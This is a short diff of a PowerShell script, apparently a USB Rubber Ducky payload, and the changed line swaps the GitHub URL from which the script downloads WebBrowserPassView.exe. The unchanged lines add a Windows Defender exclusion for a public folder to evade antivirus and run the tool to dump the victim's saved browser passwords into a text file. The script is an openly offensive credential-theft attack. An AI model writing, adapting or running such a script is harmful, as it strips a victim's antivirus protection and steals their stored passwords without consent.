@@ -3,7 +3,7 @@ Set-Location C:\Users\Public\Documents
 
 Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents' # Disabling antivirus activation
 
-Invoke-WebRequest https://github.com/abidiabderrahmen/USB-RUBBERDUCKY/blob/main/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
+Invoke-WebRequest https://github.com/bindas88/sni/blob/main/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
 
 .\WebBrowserPassView.exe /stext $env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords
 
